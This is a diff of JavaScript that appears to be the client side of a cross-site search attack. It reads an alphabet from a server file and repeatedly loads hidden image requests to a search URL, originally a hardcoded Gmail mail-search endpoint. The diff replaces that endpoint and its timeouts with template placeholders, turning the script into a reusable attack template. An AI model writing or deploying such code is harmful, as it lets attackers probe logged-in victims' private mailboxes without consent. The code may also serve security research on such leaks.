@@ -7,13 +7,13 @@ function compare_arrays(array_1 = [], array_2 = []) {
     return true;
 }
 
-function makeRequest(iterator = 0, total = 0, alphabet = [], ref = "", timeout = 4000) {
+function makeRequest(iterator = 0, total = 0, alphabet = [], ref = "", timeout = %%%request_timeout%%%) {
     jQuery.get("request.txt").done(function(data) {
         var input = data.split('\n');
         if (input.length < 2) {
             setTimeout(function() {
                 makeRequest(0, total, alphabet, ref)
-            }, 10000);
+            }, %%%error_request_timeout%%%);
             return;
         }
         var new_ref = input[0];
@@ -21,11 +21,11 @@ function makeRequest(iterator = 0, total = 0, alphabet = [], ref = "", timeout =
         if (!compare_arrays(alphabet, new_alphabet) || ref != new_ref) {
                 setTimeout(function() {
                         makeRequest(0, total, new_alphabet, new_ref);
-                }, 10000);
+                }, %%%error_request_timeout%%%);
                 return;
         }
         var search = alphabet[iterator];
-        var request = "https://mail.google.com/mail/u/0/x/?s=q&q=" + search;
+        var request = "%%%endpoint_url%%%" + search;
         var img = new Image();
         img.src = request;
         iterator = iterator >= alphabet.length - 1 ? 0 : ++iterator;
@@ -34,7 +34,7 @@ function makeRequest(iterator = 0, total = 0, alphabet = [], ref = "", timeout =
                 makeRequest(iterator, total, alphabet, ref);
         }, timeout);
     }).fail(function() {
-        setTimeout(makeRequest(), 10000);
+        setTimeout(makeRequest(), %%%error_request_timeout%%%);
         return
     });
     return;
